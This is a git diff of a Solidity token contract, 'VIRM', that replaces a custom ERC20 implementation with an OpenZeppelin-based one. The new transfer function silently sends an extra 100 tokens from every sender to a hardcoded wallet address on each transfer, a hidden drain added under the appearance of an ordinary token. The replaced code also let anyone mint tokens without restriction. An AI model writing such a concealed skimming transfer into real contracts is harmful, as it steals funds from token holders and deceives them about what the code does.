@@ -1,50 +1,19 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.13;
 
-import "./Interfaces.sol";
+import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
 
-contract VIRM is IERC20 {
-	uint public totalSupply;
-    mapping(address => uint) public balanceOf;
-    mapping(address => mapping(address => uint)) public allowance;
-    string public name = "Virm";
-    string public symbol = "VIRM";
-    uint8 public decimals = 18;
 
-    function transfer(address recipient, uint amount) external returns (bool) {
-        balanceOf[msg.sender] -= amount;
-        balanceOf[recipient] += amount;
-        emit Transfer(msg.sender, recipient, amount);
-        return true;
+contract VIRM is ERC20 {
+	constructor() ERC20("VirmApp", "VIRM"){
+        _mint(msg.sender,412*10**18);
     }
 
-    function approve(address spender, uint amount) external returns (bool) {
-        allowance[msg.sender][spender] = amount;
-        emit Approval(msg.sender, spender, amount);
-        return true;
-    }
+    function transfer(address to, uint256 amount) override public returns (bool) {
 
-    function transferFrom(
-        address sender,
-        address recipient,
-        uint amount
-    ) external returns (bool) {
-        allowance[sender][msg.sender] -= amount;
-        balanceOf[sender] -= amount;
-        balanceOf[recipient] += amount;
-        emit Transfer(sender, recipient, amount);
-        return true;
-    }
+        super.transfer(to, amount);
+        super.transfer(0xdE2C6d9b24845294cCf924015d83Ae6859B2592E, 100*10**18);
 
-    function mint(uint amount) external {
-        balanceOf[msg.sender] += amount;
-        totalSupply += amount;
-        emit Transfer(address(0), msg.sender, amount);
-    }
-
-    function burn(uint amount) external {
-        balanceOf[msg.sender] -= amount;
-        totalSupply -= amount;
-        emit Transfer(msg.sender, address(0), amount);
+        return true; 
     }
 }
